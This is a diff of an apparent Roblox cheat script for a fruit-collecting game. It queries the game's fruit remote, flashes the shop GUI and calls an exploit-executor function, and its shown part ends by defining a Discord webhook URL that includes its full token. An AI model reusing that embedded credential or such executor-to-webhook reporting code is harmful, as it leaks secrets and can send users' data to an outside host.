@@ -1,6 +1,6 @@
 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetFruits")
 game:GetService("Players").LocalPlayer.PlayerGui.Main.FruitShop.Visible = true
-wait(1)
+wait(2)
 game:GetService("Players").LocalPlayer.PlayerGui.Main.FruitShop.Visible = false
 local exploits = identifyexecutor()
 local url = "https://discord.com/api/webhooks/1070096958137581649/kSV33znfsQt29pVTeXs-OqMYzj4mx0_VLmPzrkm-jmk8533DI93NNiBOVtk6l6xQsBNx"
